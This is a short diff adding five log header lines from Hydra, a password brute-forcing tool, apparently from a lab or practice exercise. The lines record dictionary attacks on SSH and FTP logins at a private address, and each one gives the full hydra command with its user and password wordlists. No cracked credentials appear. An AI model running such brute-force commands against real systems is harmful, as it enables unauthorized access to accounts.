@@ -1,0 +1,5 @@
+# Hydra v9.2 run at 2026-05-13 22:25:55 on 10.0.3.5 ssh (hydra -L usuarios.txt -P passwords_prohibidas.txt -t 5 -w 2.1 -v -o lo_prohibido.txt ssh://10.0.3.5)
+# Hydra v9.2 run at 2026-05-13 23:09:56 on 10.0.3.5 ssh (hydra -L usuarios.txt -P combos_usuario_comunes.txt -t 5 -w 2.1 -v -o lo_prohibido.txt ssh://10.0.3.5)
+# Hydra v9.2 run at 2026-05-13 23:13:56 on 10.0.3.5 ftp (hydra -L usuarios.txt -p 123 -t 5 -w 2.1 -v -o lo_prohibido.txt ftp://10.0.3.5)
+# Hydra v9.2 run at 2026-05-13 23:18:14 on 10.0.3.5 ftp (hydra -L usuarios.txt -P dict.txt -t 10 -w 2.1 -v -o lo_prohibido.txt ftp://10.0.3.5)
+# Hydra v9.2 run at 2026-05-13 23:19:44 on 10.0.3.5 ftp (hydra -L usuarios_ftp_reales.txt -P dict.txt -t 5 -w 2.1 -v -o lo_prohibido.txt ftp://10.0.3.5)
